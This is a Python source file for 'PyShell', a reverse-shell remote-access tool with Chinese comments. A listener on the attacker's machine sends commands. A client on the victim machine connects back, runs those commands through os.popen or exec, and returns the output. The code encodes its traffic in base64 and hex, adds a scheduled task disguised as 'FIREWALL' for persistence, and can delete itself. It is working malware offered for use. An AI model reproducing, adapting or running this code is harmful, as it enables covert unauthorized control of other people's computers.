#!/usr/bin/env python
# -*- coding:utf-8 -*-


__author__='nMask'

__date__="2016.12.08"

'''
PyShell
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
PyShell主要用于建立TCP连接，反弹Shell，远程执行命令
代码结构：
---	class Server
	----connec()
	----handle_client()
	----main()
---	class Client
	----request_client()
	----response_client()
	----kill()
	----exit()
	----main()
---	Main
其中Server端为攻击机（远程发送命令），Client端为被控端（接收命令并执行）
'''

import socket
import base64
import sys
import binascii
import os
import re
import threading
import time
from StringIO import StringIO

class servers:

	""" Server of PyShell
		PyShell服务端代码类
	"""
	def __init__(self,server_address):
		self.server_address=server_address
		self.main()

	def connec(self):
		"""
		配置监听参数，包括ip地址，port号，最大链接数量等。
		"""
		try:
			self.server=socket.socket(socket.AF_INET,socket.SOCK_STREAM) #TCP套接字
			self.server.bind(self.server_address) #ip:port
			self.server.listen(10)	#设置最大连接数
			print ("[*]Listening on %s:%d" % (self.server_address[0],self.server_address[1]))
		except:
			print ('参数填写有误,或者该端口已被占用！')

	def handle_client(self):
			'''
			从客户端接收数据，并处理。
			'''
			request=self.client.recv(409600)  #服务器端每次接收的最大数据

			request=base64.b64decode(binascii.a2b_hex(request.strip())).split('*') #将接收到的数据进行解码
			print (request[0])   #输出接收到的数据
			
			path=request[1]
			contents=raw_input(path+'>')  #返回当前路径

			i='-p'
			if i in contents:
				lists=contents.split(' ')
				filename=lists[2]
				f=open(filename).read()
				contents='-p'+f

			contents_j=binascii.b2a_hex(base64.b64encode(contents)) #将要发送的数据加码
			self.client.send(contents_j+' ') #发送数据
			self.client.close()

			if contents=='kill' or contents=='exit':
				time.sleep(5)
				sys.exit()
	
	def main(self):
		self.connec() #执行连接函数
		while True:
			'''
			循环接收客户端信息
			'''
			try:
				self.client,self.addr=self.server.accept()  #接收到客户端数据对象，保存到client中，addr中的为客户端ip与端口号
				self.handle_client()   #执行接收发送数据函数
			except:
				sys.exit()


class clients:

	"""Client of PyShell
		
		PyShell客户端代码类
	"""

	def __init__(self,client_address):
		self.client_address=client_address
		self.main()

	def request_client(self):
		'''
		连接服务端
		'''
		try:
			path=os.getcwd()
			self.client=socket.socket(socket.AF_INET,socket.SOCK_STREAM)   #创建一个socket对象
			self.client.connect(self.client_address)                   #连接服务端
			self.contents=binascii.b2a_hex(base64.b64encode(self.contents+'*'+path))
			self.client.send(self.contents) #发送数据
		except:
			sys.exit()


	def kill(self):
		'''
		kill project
		'''
		os.popen('kill.bat').read()

	def exits(self):
		'''
		exit project
		'''
		os._exit(0)

	def response_client(self):
		'''
		客户端处理服务端命令函数
		'''
		try:
			response=self.client.recv(409600)
		except:
			sys.exit()
		else:
			response=base64.b64decode(binascii.a2b_hex(response.strip()))
			try:
				if response=='exit':  #退出当前连接！！
					sys.exit()
				if response=='kill':  #退出当前连接并自毁程序！！
					try:
						f=open('kill.bat','w')
						f.write('ping -n 2 127.0.0.1 >nul\ndel /F PyShell.exe\ndel /F kill.bat')
						f.close()
						threading.Thread(target=self.kill).start()
						time.sleep(0.5)
						threading.Thread(target=self.exits).start()
					except:
						pass

				if response=='playtask':        #给自己创建计划任务！
					try:
						path=os.getcwd()
						name=os.popen('whoami').read().split('\\')[1].replace('\n','')  #获取当前用户名称
						command='schtasks.exe  /Create /RU '+'"'+name+'"'+' /SC MINUTE /MO 30 /TN FIREWALL /TR '+'"'+path+'\\PyShell.exe'+'"'+' /ED 2016/12/12'  #可执行文件一定要写绝对路径
						#以上这条为添加一条计划任务的命令！！！
						self.contents=os.popen(command).read()
					except:
						pass
				else:
					i='-p'
					if i in response:
						lists=response.split('-p')
						response=lists[1]
						sys.stdout=result=StringIO()
						exec(response)                      #执行python脚本文件
						self.contents=result.getvalue()
					else:
						self.contents=response.split('cd ')
						m=re.search(self.res,response)
						if m:
							m=m.group()
						else:
							m='.'
						if len(self.contents)>1:
							os.chdir(self.contents[1].strip())          #切换目录，popen('cd ../')只能切换子目录，父目录改不了
							self.contents=' '
						else:
							self.contents=os.popen(self.contents[0]).read()   #执行普通的cmd命令
							os.chdir(m)
			except:
				self.contents=' '
				pass
			self.client.close()


	def main(self):
		self.contents=' '
		self.res=r'[A-Za-z]:'
		while True:
			self.request_client()
			self.response_client()



def mains():
	'''
	从控制台接收参数，执行相应的代码（Client or Server）
	'''
	if len(sys.argv)>3:
		type_s=str(sys.argv[1])
		ip=str(sys.argv[2])
		port=int(sys.argv[3])

		address_all=(ip,port)

		if type_s=='-listen':
			servers(address_all)
		elif type_s=='-slave':
			clients(address_all)
		else:
			print( '[HELP]  PyShell.exe [-listen(-slave)] [ip] [port]')
			print( '[HELP]  python PyShell.py [-listen(-slave)] [ip] [port]')
			print( u'connection：')
			print( u'[HELP]  exit    ----退出连接')
			print( u'[HELP]  kill    ----退出连接并自毁程序')
			print( u'[HELP]  playtask    ----创建计划任务')
			print( u'[HELP]  python -p file.py    ----在肉鸡上执行本地python脚本')
	else:
		print( '[HELP]  PyShell.exe [-listen(-slave)] [ip] [port]')
		print( '[HELP]  python PyShell.py [-listen(-slave)] [ip] [port]')
		print( u'connection：')
		print( u'[HELP]  exit    ----退出连接')
		print( u'[HELP]  kill    ----退出连接并自毁程序')
		print( u'[HELP]  playtask    ----创建计划任务')
		print( u'[HELP]  python -p file.py    ----在肉鸡上执行本地python脚本')

if __name__=='__main__':
	print (u'----------------------------------------')
	print (u'''
          ╭╮　　　　　　　╭╮　　
       　││　　　　　　　││　　
       ╭┴┴———————┴┴╮
       │　　　　　　　　　　　│　　　
       │　　　　　　　　　　　│　　　
       │　●　　　　　　　●　│
       │○　　╰┬┬┬╯　　○│
       │　　　　╰—╯　　　　│　
       ╰——┬Ｏ———Ｏ┬——╯
       　 　╭╮　　　　╭╮　　　　
       　 　╰┴————┴╯
----┏━☆━━━━━━━━━━━━┓----
----┃ PyShell V1.0               ┃----
----┃ Author: nMask              ┃----
----┃ SITE: http://thief.one     ┃----
----┗━━━━━━━━━━━━━━┛----
    ''')
	mains()